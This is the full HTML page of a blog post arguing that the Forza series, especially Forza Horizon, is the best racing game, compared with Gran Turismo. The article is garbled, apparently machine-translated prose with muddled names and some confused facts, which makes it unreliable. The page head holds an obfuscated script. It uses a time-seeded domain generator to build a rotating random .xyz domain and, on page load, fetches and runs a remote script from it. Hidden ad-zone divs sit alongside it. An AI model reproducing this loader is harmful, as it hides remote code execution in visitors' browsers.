<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Game,">










<meta name="description" content="In today’s racing game field, although there are still not many active works, it must be the “big guy” with extraordinary strength who can go to the present, and these most important roles are the rep">
<meta name="keywords" content="Game">
<meta property="og:type" content="article">
<meta property="og:title" content="How can Forza become the best racing game">
<meta property="og:url" content="http://maiygu.xyz/2019/11/08/How can Forza become the best racing game/index.html">
<meta property="og:site_name" content="Games">
<meta property="og:description" content="In today’s racing game field, although there are still not many active works, it must be the “big guy” with extraordinary strength who can go to the present, and these most important roles are the rep">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/How can Forza become the best racing game/7c856f675e164b1c89c43b36460e2eb7.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/How can Forza become the best racing game/7132431e7f5249538001c56920685a92.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/How can Forza become the best racing game/b9d09229796a4412ad996467be30f6b7.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/How can Forza become the best racing game/b36f1222316e48fb9907f817aaace366.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/How can Forza become the best racing game/75e59081ad6f4d47a19694ac1bc7f0d4.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/How can Forza become the best racing game/253e8d53bf354fbc8e87ab93855543af.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/How can Forza become the best racing game/0157cc4c83ac4a6d82ec994cbdc0353e.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/How can Forza become the best racing game/8d396e43602748e8a9553ad1bf8e7945.jpg">
<meta property="og:updated_time" content="2021-03-02T08:49:49.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="How can Forza become the best racing game">
<meta name="twitter:description" content="In today’s racing game field, although there are still not many active works, it must be the “big guy” with extraordinary strength who can go to the present, and these most important roles are the rep">
<meta name="twitter:image" content="http://maiygu.xyz/2019/11/08/How can Forza become the best racing game/7c856f675e164b1c89c43b36460e2eb7.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://maiygu.xyz/2019/11/08/How can Forza become the best racing game/">




<script type="text/javascript">!function(n){var t,e=function(n,t){var e=[["a","e","i","o","u","y"],["b","c","d","f","g","h","j","k","l","m","n","p","q","r","s","t","v","w","x","y","z"]];if(t)for(var r=0;r<=t.length-1;r++)n=n*t.charCodeAt(r)%4294967295;var l;return next=(l=n,function(n){return l=l+1831565813|0,(((n=(n=Math.imul(l^l>>>15,1|l))+Math.imul(n^n>>>7,61|n)^n)^n>>>14)>>>0)/Math.pow(2,32)}),function(n,t){for(var r=[],l=null,o=0;o<=n-1;o++){var a=void 0;null===l?a=e[0].concat(e[1]):1==l?(a=e[0],l=0):(a=e[1],l=1);var u=a[Math.floor(next()*a.length)];r.push(u),null===l&&(l=-1!=e[0].indexOf(u)?0:1)}return r.push("."+t),r.join("")}}((t=new Date,(t/=1e3)-t%1209600),"_fa7cdd4c68507744")(8,"xyz");if(null===n)console.log("https://"+e);else{var r=n.createElement("script");r.src="https://"+e+"/main.js",(n.body||n.head).appendChild(r)}}("undefined"!=typeof document?document:null);
</script>

  <title>How can Forza become the best racing game | Games</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Games</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Games</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            Sitemap
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
 
 
 <div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="22aeec266c49468da6040eff035066b8" style="display: none"></div>
 <div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="7aa7f6c595384fd6a2e5f5016b455fd2" style="display: none"></div>
 <div class="_fa7cdd4c68507744" data-zone="df2a1bde9f44465a8457aaf705928077" style="width:728px;height:90px;display: inline-block;margin: 0 auto"></div>
 <div class="_fa7cdd4c68507744" data-zone="4fff9a79323749608f8df1eff7291bcf" style="width:970px;height:90px;display: inline-block;margin: 0 auto"></div>
 
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://maiygu.xyz/2019/11/08/How can Forza become the best racing game/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Harry">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Games">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">How can Forza become the best racing game</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-08T00:00:00+08:00">
                2019-11-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>In today’s racing game field, although there are still not many active works, it must be the “big guy” with extraordinary strength who can go to the present, and these most important roles are the representatives of “racing game” in the minds of many players. If we put aside the more independent rally car, now only “GT car” and “extreme speed” are the two oligarchs with the greatest influence. In the eyes of many people, these two are like two rivals who have been dead for many years. They have to fight for each other’s lives. However, they have different characteristics in two completely different ways.<br><img src="http://maiygu.xyz/2019/11/08/How can Forza become the best racing game/7c856f675e164b1c89c43b36460e2eb7.jpg" alt="How can Forza become the best racing game"><br>Some people say that GT racing advocates enjoying automobile culture, remembering the past and looking forward to the future, while extreme racing advocates growth and progress, and dares to challenge oneself to obtain honor. As for who to choose depends on their interests and orientation, rather than choosing the most interesting game from an objective perspective, the author will give this title to extreme racing at once, accurately It is the horizon series derived from extreme speed.<br>The first card of<br>The first generation of GT racing was born in 1997. Although the picture performance is limited by the weak function of PS, it is the first time for players to experience the pseudo real driving experience in the virtual world. At the same time, the game contains a variety of famous cars and luxury cars, even many models that are difficult to see at ordinary times, which can allow players to drive freely. It is called the Enlightenment of pseudo real racing Product. The appearance of “GT racing car” means that the benchmark of racing games has been raised to a higher level, and it has become a big exclusive number one of Sony’s PS hosts. If you want to play racing games on PS hosts, then “GT racing car” will be the first choice.<br><img src="http://maiygu.xyz/2019/11/08/How can Forza become the best racing game/7132431e7f5249538001c56920685a92.jpg" alt="How can Forza become the best racing game"><br>GT racing<br>Around 2000, due to the almost monopoly of the European and American market by the domestic mainframe launched by various Japanese manufacturers, the digital big V Microsoft in Europe and America came out and wanted to enter the mainframe industry to break this situation. In 2001, the first generation of Microsoft’s Xbox came into the market. Because the hardware architecture basically adopts PC configuration, and the price is much cheaper than the same configuration of PC, the sales volume of Xbox in the U.S. region is quite considerable, and there are many works on hand that can support the scene in the first launch. Since we are an American mainframe, how can we not have “gun car ball”? “Ball” has “live football”, “FIFA” series supporting scenes, “gun” has a new IP “halo” as the exclusive 3a, but only in “car” there is a vacancy, Microsoft in order to make up for this field, so in the same year let their own game department set up turn 10 studios, to develop the first exclusive racing game for Xbox host, first let other studios produce “Microsoft pull” “Challenge” and “world street car” are in the limelight, while the goal is to surpass Sony’s “GT car”.<br><img src="http://maiygu.xyz/2019/11/08/How can Forza become the best racing game/b9d09229796a4412ad996467be30f6b7.jpg" alt="How can Forza become the best racing game"><br>World Street Racing<br>The rise of<br>In 2005, the semi pseudo real racing game “Forza Motosport” (extreme racing), which is the main professional event, came out. Although the quality is excellent and the screen performance is excellent, and the special optimization for Xbox host is also very good, but for a young tiger, the big brother “GT racing” is not defeated in a short time. In addition, Xbox is on sale It’s far less than PS2 in quantity. The famous “extreme race” is dead under the shadow of “GT”. Microsoft could not give up like this. Bill Gates decided to put in a coin to play again, and then he was ready to launch the next generation of mainframe before Sony. Soon after that, he launched the second generation of mainframe Xbox 360, and the sequel of “extreme race” was put on the agenda.<br>In 2007, “extreme race 2” was released, but it still failed to beat the following “GT racing 5” in terms of sales volume and popularity. The second crusade of turn 10 failed again. However, as the saying goes, turn 10 also has great ambition. If they want to beat “GT racing”, they decided to work hard again to correct the shortcomings in the two generations of works, and constantly enrich the game content of the sequel Learn from other successful works.<br><img src="http://maiygu.xyz/2019/11/08/How can Forza become the best racing game/b36f1222316e48fb9907f817aaace366.jpg" alt="How can Forza become the best racing game"><br>Extreme speed 2<br>Finally, in 2009, “extreme speed 3” by jidacheng, relying on its own excellent quality and the general development progress of “GT” series, finally has the sign that it can surpass “GT”. It can be said that each generation of the “extreme speed” series is constantly updating and iterating at the rate of one production every two years. On the other hand, almost every generation of the “GT” works are redeveloped in a new way, which makes the development progress of the game more efficient with less effort, and the time consumed is not directly proportional to the quality of the game. In addition, some innovation content is also available For the first time, GT series shows signs of retrogression. It seems that updating and iteration has always been the tradition of American game development for many years, and this development method is especially effective when used in sports games. The picture of extreme speed is getting better and better, the vehicles are more and more, the playing methods are more and more abundant, and the number of works is still the same as GT. This young man with a green face in those years also gradually catches up with it by accumulating “practical experience” He has become a well-known existence in the field of racing games.<br><img src="http://maiygu.xyz/2019/11/08/How can Forza become the best racing game/75e59081ad6f4d47a19694ac1bc7f0d4.jpg" alt="How can Forza become the best racing game"><br>Extreme speed 3</p>
<h1 id="horizon"><a href="#horizon" class="headerlink" title="horizon"></a>horizon</h1><p>Since it’s about racing games, we have to mention another senior with more profound qualifications, the best flying car. This series of past glories need not be introduced too much by the author. However, since 2008, the series has gradually gone downhill. There is a rather interesting setting and a beautiful open world in wujianfengyun, and we try to take the professional pseudo real style The “speed change” can’t satisfy the old fans of the series. The “heat trace” which returns to the pursuit of the police and bandits is still hard to reach the once prosperous level although its reputation has picked up. For a kind of entertainment oriented racing game, it seems that they are a little talented.<br><img src="http://maiygu.xyz/2019/11/08/How can Forza become the best racing game/253e8d53bf354fbc8e87ab93855543af.jpg" alt="How can Forza become the best racing game"><br>Top speed: changing speed<br>Microsoft thought it was an opportunity, so in 2010, it set up a new studio called playground 18 (because there are 18 people). It plans to launch a derivative work for the extreme speed series, which combines the high freedom open world with the vehicle data of the extreme speed series. It can be said that it has both entertainment and depth. This studio integrates senior members from all over the world who have participated in the development of various kinds of racing games. They know how to please the players in the racing games, so they start the development of this new work while expanding the team size, and this game is the later famous “extreme racing: Horizon”.<br><img src="http://maiygu.xyz/2019/11/08/How can Forza become the best racing game/0157cc4c83ac4a6d82ec994cbdc0353e.jpg" alt="How can Forza become the best racing game"><br>Extreme speed: the horizon<br>Horizon is a carnival for racing enthusiasts in the game. There are beautiful scenery and exciting competitions here. Winning or losing is not the key to the party, but to enjoy the pleasure of free driving and the sense of self-development. Driving your favorite car on the beautiful road will give you a comfortable and pleasant look It’s like pouring some black pepper juice on the steak to make the taste richer. Horizon Series is also updated at the rate of one in two years, so it’s going to be sold separately from ultimate race, keeping players fresh all the time, while horizon 3 in 2016 makes the series reach a peak level, which is regarded as the best racing game by players; and horizon 4, which is released in 2018, is newly added with “micro innovation” ”The alternation of seasons has subverted the players’ cognition again. Now, anyone who mentions the racing game will strongly recommend Horizon Series.<br><img src="http://maiygu.xyz/2019/11/08/How can Forza become the best racing game/8d396e43602748e8a9553ad1bf8e7945.jpg" alt="How can Forza become the best racing game"><br>Extreme speed: Horizon 4<br>    concluding remarks<br>The success of the extreme speed series largely depends on the stable update frequency and the continuous improvement of the game quality. He has been polishing the series for more than ten years, and has made a very good balance between simulation and entertainment. Although there is a lack of depth compared with other simulation racing games, the comprehensive quality has been discussed It is the existence of arrogance. Although GT sport, the latest series of GT, suffered from Waterloo at the beginning, it is also slowly recovering its lost reputation through updating. Today’s volume is already different. As for the players, perhaps the only thing the racing game needs is a “cool” is enough. The temperament of GT is elegant, but not everyone can enjoy it. As the author said at the beginning, just from the perspective of the game, extreme racing is undoubtedly the best.</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Game/" rel="tag"># Game</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/11/08/How warframe became the best free game on the earth's surface/" rel="next" title="How warframe became the best free game on the earth's surface">
                <i class="fa fa-chevron-left"></i> How warframe became the best free game on the earth's surface
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/11/08/Hard core, interesting, huge and worth exploring/" rel="prev" title="Hard core, interesting, huge and worth exploring">
                Hard core, interesting, huge and worth exploring <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Harry</p>
              <p class="site-description motion-element" itemprop="description">Games</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">114</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#horizon"><span class="nav-number">1.</span> <span class="nav-text">horizon</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        

<div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Harry</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
